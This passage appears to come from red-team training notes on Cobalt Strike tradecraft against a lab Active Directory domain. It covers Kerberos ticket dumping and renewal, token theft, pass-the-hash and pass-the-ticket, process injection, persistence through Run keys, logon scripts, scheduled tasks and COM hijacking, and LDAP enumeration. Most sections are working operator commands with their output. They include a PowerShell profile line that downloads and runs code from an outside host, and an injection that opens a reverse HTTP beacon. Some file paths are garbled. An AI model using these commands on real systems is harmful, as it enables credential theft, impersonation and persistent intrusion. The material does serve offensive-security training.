 | 0x3e7    | lon-wkstn-1$ @ CONTOSO.COM | cifs/lon-dc-1.contoso.com             | 17/02/2025 19:32:10 |
 | 0x3e7    | lon-wkstn-1$ @ CONTOSO.COM | cifs/lon-dc-1.contoso.com/contoso.com | 17/02/2025 19:32:10 |
 | 0x3e7    | lon-wkstn-1$ @ CONTOSO.COM | LON-WKSTN-1$                          | 17/02/2025 19:32:10 |
 | 0x3e7    | lon-wkstn-1$ @ CONTOSO.COM | LDAP/lon-dc-1.contoso.com             | 17/02/2025 19:32:10 |
 | 0x3e7    | lon-wkstn-1$ @ CONTOSO.COM | LDAP/lon-dc-1.contoso.com/contoso.com | 17/02/2025 19:32:10 |
 | 0x3e7    | lon-wkstn-1$ @ CONTOSO.COM | lon-wkstn-1$@CONTOSO.COM              | 17/02/2025 09:47:18 |
 -------------------------------------------------------------------------------------------------------

Rubeus' dump with no arguments extracts every ticket; /service and /luid narrow the scope. Tickets with krbtgt as the service are TGTs — everything else is a service ticket:

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0xd42c80 /service:krbtgt /nowrap

Action: Dump Kerberos Ticket Data (All Users)

[*] Current LUID    : 0x9ff74

Dumping tickets via LsaCallAuthenticationPackage never opens a handle to LSASS directly — avoiding the kernel callbacks triggered by tools like sekurlsa that read LSASS memory.

Renewing TGTs

Hashes are valid until the user's password changes; tickets have a much shorter lifetime, and an expired TGT can no longer request service tickets. Rubeus' describe shows a ticket's StartTime, EndTime, and RenewTill:

PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFq[...snip...]uQ09N

[*] Action: Describe Ticket

  ServiceName              :  krbtgt/CONTOSO.COM
  ServiceRealm             :  CONTOSO.COM
  UserName                 :  rsteel (NT_PRINCIPAL)
  UserRealm                :  CONTOSO.COM
  StartTime                :  11/04/2025 16:33:17
  EndTime                  :  12/04/2025 02:33:17
  RenewTill                :  18/04/2025 16:33:17
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  dYvwhkU1keAEgYuEbzLYOasJypZsWqJaQOMUN5hGLXw=

Windows transparently renews TGTs before expiry without re-prompting for credentials. Renew manually with Rubeus' renew command:

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe renew /ticket:doIFq[...snip...]uQ09N /nowrap

[*] Action: Renew Ticket

[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Building TGS-REQ renewal for: 'CONTOSO.COM\rsteel'

[+] TGT renewal request successful!
[*] base64(ticket.kirbi):

      doIFq[...snip...]uQ09N

describe on the renewed ticket shows updated StartTime and EndTime, but RenewTill stays the same as on the original ticket:

PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFq[...snip...]uQ09N

[*] Action: Describe Ticket

  ServiceName              :  krbtgt/CONTOSO.COM
  ServiceRealm             :  CONTOSO.COM
  UserName                 :  rsteel (NT_PRINCIPAL)
  UserRealm                :  CONTOSO.COM
  StartTime                :  11/04/2025 17:27:59
  EndTime                  :  12/04/2025 03:27:59
  RenewTill                :  18/04/2025 16:33:17
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  dYvwhkU1keAEgYuEbzLYOasJypZsWqJaQOMUN5hGLXw=

A TGT can be renewed every 10 hours up to the RenewTill date. Beyond that, a fresh TGT must be requested.

BOFs

9. User Impersonation

User Impersonation [T1550] assumes a user's identity using passwords, hashes, or Kerberos tickets obtained during Credential Access. Token impersonation, pass-the-hash, and over-pass-the-hash let you operate as other users — including domain accounts — from within an existing Beacon session.

Logon Sessions

When a user authenticates to a system, the relevant authentication package creates a logon session containing the user's identity, the authentication method, the logon type, and the credential material used. The package passes this information to the Local Security Authority (LSA), which builds the user's access token.

Access Tokens

An access token contains the security information associated with a logon session — user SID, group SIDs, integrity level, privileges, and a reference to the logon session. Every process in a logon session inherits the user's primary token; Windows checks this token against object ACLs for all access decisions (file open, registry write, etc.).

Each process gets its own token copy, so modifications don't affect other processes. A thread can also impersonate a different token, executing under a different identity or privilege set than the main process token. Commands like whoami read information from the process's primary token.

Credential Cache

LSASS stores credentials — plaintext, NTLM/AES hashes, Kerberos tickets — for active logon sessions. When a process accesses a network resource, Windows uses the logon session reference in the process's access token to look up the cached credential material and authenticate transparently.

9.1 Token Impersonation

Token impersonation runs the current thread under another user's access token — either created from plaintext credentials or stolen from a process running in a different logon session.

9.1.1 make_token

make_token creates a new access token from plaintext credentials using LogonUserA + ImpersonateLoggedOnUser, then impersonates it:

beacon> make_token CONTOSO\rsteel Passw0rd!
[+] Impersonated CONTOSO\rsteel (netonly)

Beacon now uses the alternate credentials for network resources — local actions are unaffected. Cobalt Strike updates the "user" field in the session view to indicate impersonation.

9.1.2 steal_token

Token theft duplicates a primary access token from a process running as a different user and uses it for impersonation. The steps are:

  1. Open a handle to the target process with OpenProcess
  2. Open the process token with OpenProcessToken
  3. Duplicate the token with DuplicateTokenEx
  4. Impersonate with ImpersonateLoggedOnUser

Beacon's steal_token wraps this — identify the target process first with ps or the Process Browser:

beacon> ps

 PID   PPID  Name                       Arch  Session     User
 ---   ----  ----                       ----  -------     ----
 5248  1864  cmd.exe                    x64   0           CONTOSO\rsteel
 5256  5248      conhost.exe            x64   0           CONTOSO\rsteel
 5352  5248      mmc.exe                x64   0           CONTOSO\rsteel
 
beacon> steal_token 5248
[+] Impersonated CONTOSO\rsteel

9.1.3 rev2self

rev2self stops impersonation by calling RevertToSelf, returning Beacon to its original token.

9.1.4 token-store

If the source process exits after steal_token, the token reference dies with it. The token store keeps a permanent handle — kernel reference-counting prevents the token from being disposed while a handle remains open. token-store manages the saved tokens:

  • steal <pid> — steal a token from a process and add it to the store
  • show — list saved tokens
  • use <id> — impersonate a stored token
  • remove <id> / remove-all — drop tokens
beacon> token-store steal 5248
[*] Stored Tokens

 ID   PID   User
 --   ---   ----
 0    5248  CONTOSO\rsteel
 
beacon> token-store use 0
[+] Impersonated CONTOSO\rsteel

9.2 Pass the Hash

Pass the Hash (PtH) [T1550.002] uses an NTLM hash to impersonate a user. Two implementation styles:

  • Linux tools (e.g. Impacket) — use raw NTLM authentication for SMB and other protocols
  • Windows tools (e.g. Mimikatz) — patch the hash directly into a logon session's credential cache

Kerberos has replaced NTLM as the default protocol — NTLM traffic is increasingly anomalous and may be restricted in hardened environments.

Beacon's built-in pth [DOMAIN\user] [hash] wraps sekurlsa::pth. It echoes random data into a named pipe and impersonates that pipe to assume the identity:

beacon> pth CONTOSO\rsteel fc525c9683e8fe067095ba2ddc971889
[*] Tasked beacon to run mimikatz's sekurlsa::pth /user:"rsteel" /domain:"CONTOSO" /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:"%COMSPEC% /c echo 8d3f86487c1 > \\.\pipe\f08610" command

user	: rsteel
domain	: CONTOSO
program	: C:\Windows\system32\cmd.exe /c echo 8d3f86487c1 > \\.\pipe\f08610
impers.	: no
NTLM	: fc525c9683e8fe067095ba2ddc971889
  |  PID  2920
  |  TID  3716
  |  LSA Process is now R/W
  |  LUID 0 ; 18729858 (00000000:011dcb82)
  \_ msv1_0   - data copy @ 000001F7FB8EA9D0 : OK !
  \_ kerberos - data copy @ 000001F7FB8FCD28
   \_ des_cbc_md4       -> null             
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 000001F7FB8D77A8 (32) -> null

As covered in the Defence Evasion chapter, Defender blocks this built-in flow. The alternative is to have Mimikatz spawn a generic process and steal its token manually:

[-] could not open \\lon-ws-1\c$\*: 5 - ERROR_ACCESS_DENIED

9.3 Pass the Ticket

Pass the Ticket [T1550.003] uses stolen or forged Kerberos tickets for impersonation. Impacket implements Kerberos natively for remote auth; Rubeus injects tickets into a logon session's credential cache. PtT is preferable to PtH for three reasons:

  • Kerberos isn't restricted or flagged like NTLM
  • Ticket injection uses native Windows APIs — no LSASS patching
  • Not blocked by Protected Process Light (PPL)

9.3.1 Requesting TGTs

With a user's NTLM hash or AES keys, an adversary can request Kerberos tickets on their behalf. The NTLM hash produces RC4-encrypted tickets, which are anomalous against modern AES-only environments — request AES tickets where possible. Rubeus' asktgt with an AES key returns the ticket base64-encoded:

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
[*] Building AS-REQ (w/ preauth) for: 'CONTOSO.COM\rsteel'
[*] Using domain controller: 10.10.120.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFo[...snip...]kNPTQ==

  ServiceName              :  krbtgt/CONTOSO.COM
  ServiceRealm             :  CONTOSO.COM
  UserName                 :  rsteel (NT_PRINCIPAL)
  UserRealm                :  CONTOSO.COM
  StartTime                :  17/02/2025 13:18:21
  EndTime                  :  17/02/2025 23:18:21
  RenewTill                :  24/02/2025 13:18:21
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  7ImgleIR6fnHZCxJW7MJUCabAjxvIsMS7Z55VRPaEHU=
  ASREP (key)              :  05579261E29FB01F23B007A89596353E605AE307AFCD1AD3234FA12F94EA696

9.3.2 Injecting TGTs

Beacon's kerberos_ticket_use imports a .kirbi ticket into the current logon session. The file must exist on the machine running the CS client. Convert a base64-encoded ticket from Rubeus with PowerShell:

$ticket = "doIFo[...snip...]kNPTQ=="
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String($ticket))

Injecting a TGT overwrites the existing ticket in the logon session. Avoid clobbering a real user's TGT — create a sacrificial logon session to isolate the injected ticket. Use make_token with a fake password (the real password is not required for the sacrificial session):

beacon> make_token CONTOSO\rsteel FakePass
[+] Impersonated CONTOSO\rsteel (netonly)

The new LUID has an empty ticket cache. Inject the TGT:

beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi

Beacon now authenticates as the impersonated user. Remove tickets without dropping the session with kerberos_ticket_purge; dispose of the session entirely with rev2self.

9.3.3 The Rubeus way

Rubeus injects tickets with ptt /luid:[luid] /ticket:[ticket]. The ticket can be base64 or a path to a .kirbi — the path resolves on the machine Beacon runs on, not the CS client.

Rubeus' createnetonly replaces make_token for creating sacrificial logon sessions — it spawns a hidden process in a new logon session and returns the PID and LUID:

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows
otepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass

[*] Action: Create Process (/netonly)

[*] Using CONTOSO.COM\rsteel:FakePass

[*] Showing process : False
[*] Username        : rsteel
[*] Domain          : CONTOSO.COM
[*] Password        : FakePass
[+] Process         : 'C:\Windows
otepad.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2524
[+] LUID            : 0x132ef34

Inject the ticket into the new LUID:

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x132ef34 /ticket:doIFoDCCBZygAwIBBaEDAgEWooIEqjCCBKZhggSiMIIEnqADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBGQwggRgoAMCARKhAwIBAqKCBFIEggROtBamcnEu/7ynHLwUewKlaWuh5t/323kFYx8tjVxdEYlMwiqm+EMYSDI5Fz+nuNtX6Xx2JOafezhIrh7G/YdBP1ON6Mztyfk18HeLns88lioPofyqrVFEn/Z6LP/1FGVSvYE7ppoDFjq2wbD5WWMDm330g9U3XtfYTs/AuAVxrEIhOtdqZYnUHxuG2+dphKn4bz5L086edK32xOa0EyagP3elH6uPL0pijao3sS4ndpf6/gvdtBqAg2AR1vby27WEMeksfyWF7ysuL0ae6GwvpSrJuwhYC9vcLXYWtNK4UKWJpy+SrXXA8ylxsLHcWHYo0wz1+lsOCefpRk1TvrUUvKIPJhjSNHpPB3+6/aY5b1k8if8cxdet5vWCMloYprc9KpSRiu8AtZS0VPBvlUfTVe4z4SsmdI2N1z/OsQGfnPFm5O22dN8PKhI2C0jv8vSzB245kLiPHM1V+yL0f5zdN3RT0jn7bd3GoXEMKkxZllaqu6aenCnCtV4Wi9MhMeyWyRwsux5PxTh3BgXYG201FUiKDr3q5QWXNjpnFYplGQEOMYReMtt/AYN1fSPsPStCImmpSTjx9nuFOuEu9jadnhk2bRt6vMGQUKzO4vaFSzGFIbjWzT3y6cuViSMCugSVJaaFluAyw2a4vBpyb/tM/kzOiHm9BBW4/a1QRYdqF4/BSFM1RGXjqSqhoCFEN+bn1nPv4PDReTrHvFiUtX29Ehh3PThv7BFaNHfNTrS+IbVTC7kP8xKk88Puy/BpEsaFBkpLxGbNc9fT8JUI+D4IPmubUKR+ApfMKf4efdjqxVsfhXrJeUmPYLi3KnlhsGTkOvxvQ9F5npdZ4IB8mJBa68ExmC/6NML6DRJfkRPKmebTcMvwhlQ1o7bqor+hKglo0V5V0DI902nYR4LUoDoXkaWsz5NDPnEilwDe4hL8v6c3JOKLzWVMkxE8DrGqJF8Sv8JOYT4/380w/4Jl/CxjVcu59TuPO5sA2nTRRiKBEG9anfBkUPcw+pGCLBN6Fsr4+0qQckYFqxFbtDesXjUsEsuGG+yURhbuownT0c9bDMbasiuzH6BComfGS7b85bA3arTkzrIgXfD2T/baLjc9tHH2L8WmTkRkb34ecxn8aKnc9gBQKOgs+8X4LED2ZIcyMGm5ddNz83eZGeOlmlzVu72IYTU7L3nGP5sAHNmnl7bvPADqh7WVkH1okgs+McG83TzuO6Wf4w7Wu8gl5QCmODLkDb/0crOSPq81UzAFLZfSeaH1hKxvTTepxYP7VjwBJnWsm5nmQfd5m3hOb/YvJ1wC1VS5sFRJW0R9eFIzNh/Tof+a2QU6beI/8IntmoabVujrAn/2Z41gCd/zbH0KgsalQBCzPcK7cYrpsDZ7aLdizOmM7Z02mT1WhLsuQdaXXafc3+Ns3ZPQHCatUAMPU6qz4efKWnoZowFGFmHwVeMtl01D3q/1EaGg16A2yKOB4TCB3qADAgEAooHWBIHTfYHQMIHNoIHKMIHHMIHEoCswKaADAgESoSIEIGGgxK5dlc1UgsHScNHrnVcHwW7TspwF/Ki2xYMO7K2voQ0bC0NPTlRPU08uQ09NohMwEaADAgEBoQowCBsGcnN0ZWVsowcDBQBA4QAApREYDzIwMjUwMjE3MTM0MjMzWqYRGA8yMDI1MDIxNzIzNDIzM1qnERgPMjAyNTAyMjQxMzQyMzNaqA0bC0NPTlRPU08uQ09NqSAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTQ==

[*] Action: Import Ticket

Steal the token of the spawned process to use the ticket:

beacon> steal_token 2524
[+] Impersonated CONTOSO\pchilds

Drop impersonation with rev2self, then terminate the spawned process with kill.

9.3.4 The getuid Confusion

getuid reads the primary access token of the Beacon process — not the impersonated token. PtH/PtT changes the logon session credentials but the process owner is unchanged, so getuid still shows the original spawning user.

9.4 Process Injection

A cruder but effective impersonation technique: inject [T1055] Beacon shellcode directly into a process the target user owns. The new Beacon runs in that process's address space, inheriting its security context. Identify the target process with ps or the Process Browser, then inject:

 PID   PPID  Name                       Arch  Session     User
 ---   ----  ----                       ----  -------     ----
 5248  1864  cmd.exe                    x64   0           CONTOSO\rsteel
 5256  5248      conhost.exe            x64   0           CONTOSO\rsteel
 5352  5248      mmc.exe                x64   0           CONTOSO\rsteel
 
beacon> inject 5248 x64 http
[*] Tasked beacon to inject windows/beacon_http/reverse_http (www.bleepincomputer.com:80) into 5248 (x64)

10. Persistence

Persistence [TA0003] re-executes payloads after reboots or session loss via configuration changes tied to a trigger. It's critical for long-term engagements where re-exploitation is unreliable. This section covers user-level techniques achievable from a Beacon without touching disk unnecessarily; elevated persistence requires privilege escalation and is covered in §7.6.

10.1 Boot & Logon Autostart Execution

Boot or Logon Autostart Execution [T1547] is a collection of techniques that auto-run a payload on startup or user logon.

10.1.1 Registry Run Keys

The Windows Registry has multiple keys that run programs at logon — used legitimately by default Windows applications and third-party software. The two common user keys are HKCU\Software\Microsoft\Windows\CurrentVersion\Run and HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce.

Run fires every logon; RunOnce is deleted after first execution. Write the payload path as a new value with reg_set [host] <hive> <key> <value> <type> <data>:

beacon> cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe

beacon> reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_EXPAND_SZ %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe
Setting registry key \\.\0000000080000001\Software\Microsoft\Windows\CurrentVersion\Run\Updater with type 1
Successfully set regkey
SUCCESS.

Verify with reg_query:

beacon> reg_query HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater

  01/07/2025 11:51:52 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    Updater                REG_EXPAND_SZ          %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe

10.1.2 Startup Folder

Programs in the user's startup folder will also run automatically on login. The location of this folder is %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup . Simply upload an executable into this directory and it will run each time the user logs in.

beacon> cd C:\Users\pchilds\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe

10.2 Logon Script

Add UserInitMprLogonScript [T1037.001] to HKCU\Environment with a path to your payload — it executes automatically at user logon.

beacon> reg_set HKCU Environment UserInitMprLogonScript REG_EXPAND_SZ %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\updater.exe

Setting registry key \\.\0000000080000001\Environment\UserInitMprLogonScript with type 2
Successfully set regkey
SUCCESS.

10.3 PowerShell Profile

profile.ps1 executes on every new PowerShell session. Modifying or creating a user's profile installs persistent code execution [T1546.013]. Profile paths are documented for PowerShell 5.1 and PowerShell Core — the user-scoped path is $HOME\Documents\WindowsPowerShell\Profile.ps1. Create the file (and directory) if absent:

ls C:\Users\pchilds\Documents

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     12/22/2024 16:47:10   My Music
          dir     12/22/2024 16:47:10   My Pictures
          dir     12/22/2024 16:47:10   My Videos
 402b     fil     12/22/2024 16:47:22   desktop.ini
 
beacon> mkdir C:\Users\pchilds\Documents\WindowsPowerShell
beacon> cd C:\Users\pchilds\Documents\WindowsPowerShell

The profile must not block — PowerShell suppresses the prompt until the profile script returns. Run the payload asynchronously with Start-Job:

$_ = Start-Job -ScriptBlock { iex (new-object net.webclient).downloadstring("http://bleepincomputer.com/a") }

Upload the profile to the user's WindowsPowerShell directory:

beacon> upload C:\Payloads\Profile.ps1

10.4 Scheduled Task

The Windows Task Scheduler runs tasks on predefined triggers — schedules, idle states, logon events, system events, and more. Legitimate uses include software updates and cleanup tasks. Adversaries register scheduled tasks to execute payloads on a chosen trigger [T1053.005].

Tasks are defined in XML. The schtaskscreate BOF accepts an XML definition — the following triggers when pchilds logs in:

<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <UserId>CONTOSO\pchilds</UserId>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal>
      <UserId>CONTOSO\pchilds</UserId>
    </Principal>
  </Principals>
  <Settings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
  </Settings>
  <Actions>
    <Exec>
      <Command>%LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe</Command>
    </Exec>
  </Actions>
</Task>

Running schtaskscreate \Beacon XML CREATE with no further arguments opens a file dialog to browse for the XML definition:

beacon> schtaskscreate \Beacon XML CREATE

createTask hostname: taskpath:\Beacon mode:2 force:0
Got user name and security descriptor
Valitdated task
Created task path
Registered task
SUCCESS.

10.5 COM Hijacking

COM (Component Object Model) is an interoperability standard letting applications written in different languages share libraries. COM exposes functionality through interfaces — software contracts defining method names, inputs, and return types. A minimal C# interface:

interface IMyInterface
{
    string MyMethod(string myInput);
}

An implementing class fulfils the contract:

class MyImplementation : IMyInterface
{
    public string MyMethod(string myInput)
    {
        Console.WriteLine(myInput);
        return $"You said: {myInput}.";
    }
}

A COM "component" is an interface plus its implementation. Each COM object is identified by a CLSID (GUID) registered at HKEY_CLASSES_ROOT\CLSID. Each CLSID entry has an InProcServer32 or LocalServer32 subkey pointing at the DLL or EXE that provides the implementation.

COM hijacking [T1546.015] modifies a COM entry to trick an application into loading malicious code. Two viable variants:

  • Missing HKCU entry — HKEY_CLASSES_ROOT merges HKLM\Software\Classes and HKCU\Software\Classes; for standard-user processes, HKCU takes priority. If a CLSID is defined only in HKLM, an attacker can write a hijacking entry into HKCU.
  • Stale path — a CLSID points at a DLL or EXE that no longer exists, often left behind by uninstalled third-party software. If the path is in a user-writable location, drop a malicious binary there.

10.5.1 Finding COM hijacks

Process Monitor shows real-time registry access. Filter for failed COM lookups — operation RegOpenKey with result NAME NOT FOUND on paths under HKCU\Software\Classes\CLSID. Most results are noise; export to CSV for frequency analysis to find COM objects loaded by a modest number of processes.

One reliable hijack target is the COM object loaded by DllHost.exe at HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32. The CLSID is defined in HKLM but not HKCU:

PS C:\Users\Attacker> Get-Item -Path "HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"

    Hive: HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}

Name                           Property
----                           --------
InprocServer32                 (default)      : C:\Windows\System32	humbcache.dll
                               ThreadingModel : Apartment

PS C:\Users\Attacker> Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32' because it does not exist.

Create the CLSID and InprocServer32 entries in HKCU pointing at a DLL payload:

PS C:\Users\Attacker> New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
PS C:\Users\Attacker> New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
PS C:\Users\Attacker> New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"

Logging out and back in triggers DllHost.exe to load the COM object — the malicious DLL runs and a new Beacon should appear.

11. Discovery

Discovery [TA0007] enumerates systems, resources, and misconfigurations accessible to compromised accounts — a prerequisite for Lateral Movement. Domain enumeration with SharpHound and PowerView maps the AD attack surface; host enumeration reveals local privilege paths and network visibility. Output from this phase feeds directly into lateral movement and AD exploitation.

Standard domain users can perform basic AD queries — users, groups, OUs, GPOs. Typical objectives: which groups a user belongs to and which computers they have local admin on. Most domain enumeration tools use LDAP (TCP 389) or LDAPS (TCP 636); ADWS (Active Directory Web Services), which wraps LDAP queries in SOAP over HTTP, is gaining popularity as a stealthier alternative.

BloodHound

BloodHound (SpecterOps) visualises attack paths in AD and Entra ID. The Community Edition is offensive-focused; Enterprise targets defenders — see the edition comparison. Standard collectors are SharpHound (Windows .NET), AzureHound, and BloodHound.py.

Default collectors are loud:

  • Vendors signature their hardcoded LDAP queries
  • Large LDAP retrievals stand out against baseline traffic
  • Queries are logged via ETW (client-side) and performance events (server-side)

For threat emulation, prefer custom LDAP queries via ldapsearch or pyldapsearch. Convert the output to BloodHound JSON with BOFHound and ingest into the UI.

BloodHound CE runs in Docker via the BH-CLI wrapper around Docker Compose. The UI is available at http://localhost:8080 once the containers are running.

11.1 Lightweight Directory Access Protocol

LDAP queries domain controllers over TCP 389 (LDAP) or 636 (LDAPS). Sessions authenticate via the caller's domain context or explicit credentials. Every directory object has an objectClass defining its allowed attributes. Common classes:

  • user — user accounts (also assigned to computers)
  • computer — computer accounts
  • group — security and distribution groups
  • organizationalUnit — OUs
  • groupPolicyContainer — GPOs
  • domain / domainDNS — domain objects

11.1.1 Querying LDAP

Object classes overlap in unintuitive ways. Computer accounts have the classes person, organizationalPerson, user, and computer — so searches for person or user return computers as well. Prefer sAMAccountType for unambiguous account-type filtering.

Indexes

Searching indexed attributes is significantly faster than non-indexed ones. Microsoft documents which AD attributes are indexed — prefer these for queries. Index choice is also OPSEC-relevant (see OPSEC section below).

Filters

LDAP searches require a filter specifying object criteria. To find all users: filter on sAMAccountType = SAM_NORMAL_USER_ACCOUNT (0x30000000 / 805306368).

beacon> ldapsearch (samAccountType=805306368)

User objects store descriptive attributes (name, SID, logon count, UAC flags, group membership) plus class-agnostic ones like distinguishedName and objectGUID.

Binding to 10.10.120.1

[*] Distinguished name: DC=contoso,DC=com
[*] targeting DC: \\lon-dc-1.contoso.com
[*] Filter: (sAMAccountType=805306368)
[*] Scope of search value: 3
[*] Returning specific attribute(s): *

--------------------
objectClass: top, person, organizationalPerson, user
cn: Administrator
description: Built-in account for administering the computer/domain
distinguishedName: CN=Administrator,CN=Users,DC=contoso,DC=com
instanceType: 4
whenCreated: 20250124135010.0Z
whenChanged: 20250303132351.0Z
uSNCreated: 8196
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=contoso,DC=com, CN=Domain Admins,CN=Users,DC=contoso,DC=com, CN=Enterprise Admins,CN=Users,DC=contoso,DC=com, CN=Schema Admins,CN=Users,DC=contoso,DC=com, CN=Administrators,CN=Builtin,DC=contoso,DC=com
uSNChanged: 36919
name: Administrator
objectGUID: f1f979c4-11a0-4929-8147-c53305544d1c
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 133861646754853919
logonHours: ////////////////////////////
pwdLastSet: 133821991894459748
primaryGroupID: 513
objectSid: S-1-5-21-3926355307-1661546229-813047887-500
adminCount: 1
accountExpires: 0
logonCount: 40
sAMAccountName: Administrator
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=contoso,DC=com
isCriticalSystemObject: TRUE
dSCorePropagationData: 20250124140605.0Z, 20250124140605.0Z, 20250124135054.0Z, 16010101181216.0Z
lastLogonTimestamp: 133854817944673761
msDS-SupportedEncryptionTypes: 0
--------------------

Filters can combine criteria with & (and) and | (or). The following returns every user object with adminCount=1:

beacon> ldapsearch (&(samAccountType=805306368)(adminCount=1))

Returns user objects whose description contains "admin" or whose samAccountName contains "adm":

beacon> ldapsearch (&(samAccountType=805306368)(|(description=*admin*)(samaccountname=*adm*)))

The ! operator excludes matches — here, the krbtgt account is excluded:

beacon> ldapsearch (&(samAccountType=805306368)(adminCount=1)(!(name=krbtgt)))

Operators sit at the start of the grouping ((&(a)(b))), not between operands (((a)&(b))).

Attributes

By default every attribute is returned. Use --attributes in ldapsearch to limit the output — here, only name and group membership:

beacon> ldapsearch (&(samAccountType=805306368)(adminCount=1)) --attributes name,memberof

--------------------
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=contoso,DC=com, CN=Domain Admins,CN=Users,DC=contoso,DC=com, CN=Enterprise Admins,CN=Users,DC=contoso,DC=com, CN=Schema Admins,CN=Users,DC=contoso,DC=com, CN=Administrators,CN=Builtin,DC=contoso,DC=com
name: Administrator
--------------------
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=contoso,DC=com
name: krbtgt
--------------------
memberOf: CN=Domain Admins,CN=Users,DC=contoso,DC=com
name: Dean York
--------------------

Append ntsecuritydescriptor to read an object's security descriptor (ACL) — output is base64-encoded and BOFHound parses it:

beacon> ldapsearch (&(samAccountType=805306368)(adminCount=1)) --attributes name,memberof,ntsecuritydescriptor

--------------------
memberOf: CN=Domain Admins,CN=Users,DC=contoso,DC=com
nTSecurityDescriptor: AQAEn[...snip...]AIAAA==
name: Dean York
--------------------

For every attribute plus the security descriptor, use *,ntsecuritydescriptor.

Bitwise Filters

LDAP supports bitwise operators via OIDs:

  • 1.2.840.113556.1.4.803 — LDAP_MATCHING_RULE_BIT_AND
  • 1.2.840.113556.1.4.804 — LDAP_MATCHING_RULE_BIT_OR
  • 1.2.840.113556.1.4.1941 — LDAP_MATCHING_RULE_IN_CHAIN (recursive group membership)

Bitwise AND tests flag attributes like userAccountControl. TRUSTED_FOR_DELEGATION (0x80000 = 524288) flags computers configured for unconstrained delegation:

beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname

sAMAccountName: LON-DC-1$

LDAP_MATCHING_RULE_IN_CHAIN queries all ancestors of an object in a single request — useful for unrolling nested group membership without multiple sequential queries.

beacon> ldapsearch "(memberof:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=contoso,DC=com)" --attributes samaccountname

--------------------
sAMAccountName: Administrator
--------------------
sAMAccountName: dyork
--------------------
sAMAccountName: Server Admins
--------------------
sAMAccountName: Workstation Admins
